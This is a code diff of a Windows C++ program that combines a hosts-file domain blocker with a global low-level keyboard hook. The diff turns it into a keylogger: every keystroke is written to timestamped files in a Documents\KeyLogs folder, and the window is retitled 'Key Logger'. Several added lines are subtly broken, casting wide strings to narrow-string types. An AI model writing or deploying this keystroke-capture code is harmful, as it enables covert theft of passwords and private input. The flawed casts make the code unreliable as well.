@@ -2,11 +2,16 @@
 #include <fstream>
 #include <string>
 #include <Windows.h>
+#include <Shlobj.h>
+#include <ctime>
+#include <locale>
+#include <codecvt>
 
 HWND hwndBlockButton;
 HWND hwndUnblockButton;
 HWND hwndDomainInput;
 HWND hwndIpAddressInput;
+std::ofstream logFile;
 
 bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
 {
@@ -58,7 +63,7 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
         {
             // Handle the key press
-            std::cout << "Key pressed: " << vkCode << std::endl;
+            logFile << "Key pressed: " << vkCode << std::endl;
         }
     }
 
@@ -74,33 +79,33 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             CreateWindow("STATIC", "Enter the domain and IP address to block/unblock:",
                          WS_VISIBLE | WS_CHILD,
                          20, 20, 360, 20,
-                         hwnd, NULL, NULL, NULL);
+                         hwnd, nullptr, nullptr, nullptr);
 
             hwndDomainInput = CreateWindow("EDIT", "",
                                            WS_VISIBLE | WS_CHILD | WS_BORDER,
                                            20, 50, 200, 30,
-                                           hwnd, NULL, NULL, NULL);
+                                           hwnd, nullptr, nullptr, nullptr);
 
             hwndIpAddressInput = CreateWindow("EDIT", "",
                                               WS_VISIBLE | WS_CHILD | WS_BORDER,
                                               20, 90, 200, 30,
-                                              hwnd, NULL, NULL, NULL);
+                                              hwnd, nullptr, nullptr, nullptr);
 
             hwndBlockButton = CreateWindow("BUTTON", "Block",
                                            WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                            20, 130, 150, 30,
-                                           hwnd, NULL, NULL, NULL);
+                                           hwnd, nullptr, nullptr, nullptr);
 
             hwndUnblockButton = CreateWindow("BUTTON", "Unblock",
                                              WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                              200, 130, 150, 30,
-                                             hwnd, NULL, NULL, NULL);
+                                             hwnd, nullptr, nullptr, nullptr);
 
-            HINSTANCE hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));
+            auto hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));
 
             // Install the keyboard hook
             HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);
-            if (hKeyboardHook == NULL)
+            if (hKeyboardHook == nullptr)
             {
                 MessageBox(hwnd, "Failed to install the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
             }
@@ -109,55 +114,106 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 // Store the hook handle in the window user data
                 SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(hKeyboardHook));
             }
+
+            // Create the KeyLogs folder under the Documents folder
+            PWSTR documentsPath;
+            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath)))
+            {
+                std::wstring keyLogsFolder = std::wstring(documentsPath) + L"\\KeyLogs";
+                CreateDirectory(reinterpret_cast<LPCSTR>(keyLogsFolder.c_str()), nullptr);
+
+                // Generate a unique file name using timestamp
+                std::time_t now = std::time(nullptr);
+                std::tm* timeInfo = std::localtime(&now);
+                char timestamp[20];
+                std::strftime(timestamp, sizeof(timestamp), "%Y%m%d%H%M%S",timeInfo);
+
+                std::string logFileName = "LOG_" + std::string(timestamp) + ".txt";
+
+                std::wstring logFilePath = keyLogsFolder + L"\\" + std::wstring(logFileName.begin(), logFileName.end());
+
+                std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+                std::string logFilePathUtf8 = converter.to_bytes(logFilePath);
+
+                logFile.open(logFilePathUtf8, std::ios_base::app);
+
+                CoTaskMemFree(documentsPath);
+            }
         }
             break;
 
         case WM_COMMAND:
         {
-            if (lParam == (LPARAM)hwndBlockButton)
+            if (reinterpret_cast<HWND>(lParam) == hwndBlockButton)
             {
-                char domain[256];
-                char ipAddress[256];
+                // Handle the block button click
+                const int bufferSize = 256;
+                wchar_t domainBuffer[bufferSize];
+                wchar_t ipAddressBuffer[bufferSize];
 
-                GetWindowTextA(hwndDomainInput, domain, sizeof(domain));
-                GetWindowTextA(hwndIpAddressInput, ipAddress, sizeof(ipAddress));
+                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
+                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);
 
-                if (AddHostEntry(domain, ipAddress))
+                std::wstring domain(domainBuffer);
+                std::wstring ipAddress(ipAddressBuffer);
+
+                std::string domainUtf8(domain.begin(), domain.end());
+                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());
+
+                if (AddHostEntry(domainUtf8, ipAddressUtf8))
                 {
-                    MessageBox(hwnd, "Domain blocked successfully.", "Success", MB_OK | MB_ICONINFORMATION);
+                    MessageBox(hwnd, "Host entry added successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                 }
                 else
                 {
-                    MessageBox(hwnd, "Failed to block domain.", "Error", MB_OK | MB_ICONERROR);
+                    MessageBox(hwnd, "Failed to add the host entry.", "Error", MB_OK | MB_ICONERROR);
                 }
             }
-            else if (lParam == (LPARAM)hwndUnblockButton)
+            else if (reinterpret_cast<HWND>(lParam) == hwndUnblockButton)
             {
-                char domain[256];
-                char ipAddress[256];
+                // Handle the unblock button click
+                const int bufferSize = 256;
+                wchar_t domainBuffer[bufferSize];
+                wchar_t ipAddressBuffer[bufferSize];
 
-                GetWindowTextA(hwndDomainInput, domain, sizeof(domain));
-                GetWindowTextA(hwndIpAddressInput, ipAddress, sizeof(ipAddress));
+                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
+                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);
 
-                if (RemoveHostEntry(domain, ipAddress))
+                std::wstring domain(domainBuffer);
+                std::wstring ipAddress(ipAddressBuffer);
+
+                std::string domainUtf8(domain.begin(), domain.end());
+                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());
+
+                if (RemoveHostEntry(domainUtf8, ipAddressUtf8))
                 {
-                    MessageBox(hwnd, "Domain unblocked successfully.", "Success", MB_OK | MB_ICONINFORMATION);
+                    MessageBox(hwnd, "Host entry removed successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                 }
                 else
                 {
-                    MessageBox(hwnd, "Failed to unblock domain.", "Error", MB_OK | MB_ICONERROR);
+                    MessageBox(hwnd, "Failed to remove the host entry.", "Error", MB_OK | MB_ICONERROR);
                 }
             }
         }
             break;
 
-        case WM_DESTROY:
+        case WM_CLOSE:
         {
-            // Uninstall the keyboard hook
-            HHOOK hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
-            UnhookWindowsHookEx(hKeyboardHook);
-            PostQuitMessage(0);
+            // Clean up resources and close the log file
+            auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
+            if (hKeyboardHook != nullptr)
+            {
+                UnhookWindowsHookEx(hKeyboardHook);
+            }
+
+            logFile.close();
+
+            DestroyWindow(hwnd);
         }
+            break;
+
+        case WM_DESTROY:
+            PostQuitMessage(0);
             break;
 
         default:
@@ -169,37 +225,43 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    // Register the window class
-    WNDCLASS wc = { 0 };
+    const wchar_t CLASS_NAME[] = L"KeyLogger";
+
+    WNDCLASS wc = {};
     wc.lpfnWndProc = WindowProc;
     wc.hInstance = hInstance;
-    wc.lpszClassName = "BlockDomainWindowClass";
+    wc.lpszClassName = reinterpret_cast<LPCSTR>(CLASS_NAME);
 
-    if (!RegisterClass(&wc))
+    RegisterClass(&wc);
+
+    HWND hwnd = CreateWindowEx(
+            0,                              // Optional window styles.
+            reinterpret_cast<LPCSTR>(CLASS_NAME),                     // Window class
+            reinterpret_cast<LPCSTR>(L"Key Logger"),                  // Window text
+            WS_OVERLAPPEDWINDOW,            // Window style
+
+            // Size and position
+            CW_USEDEFAULT, CW_USEDEFAULT, 400, 250,
+
+            nullptr,       // Parent window
+            nullptr,       // Menu
+            hInstance,  // Instance handle
+            nullptr        // Additional application data
+    );
+
+    if (hwnd == nullptr)
     {
-        MessageBox(NULL, "Window registration failed.", "Error", MB_OK | MB_ICONERROR);
-        return 1;
+        return 0;
     }
 
-    // Create the window
-    HWND hwnd = CreateWindow(wc.lpszClassName, "Block Domain",
-                             WS_OVERLAPPEDWINDOW | WS_VISIBLE,
-                             CW_USEDEFAULT, CW_USEDEFAULT, 400, 250,
-                             NULL, NULL, hInstance, NULL);
+    ShowWindow(hwnd, nCmdShow);
 
-    if (hwnd == NULL)
-    {
-        MessageBox(NULL, "Window creation failed.", "Error", MB_OK | MB_ICONERROR);
-        return 1;
-    }
-
-    // Message loop
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
+    MSG msg = {};
+    while (GetMessage(&msg, nullptr, 0, 0))
     {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    return static_cast<int>(msg.wParam);
+    return 0;
 }
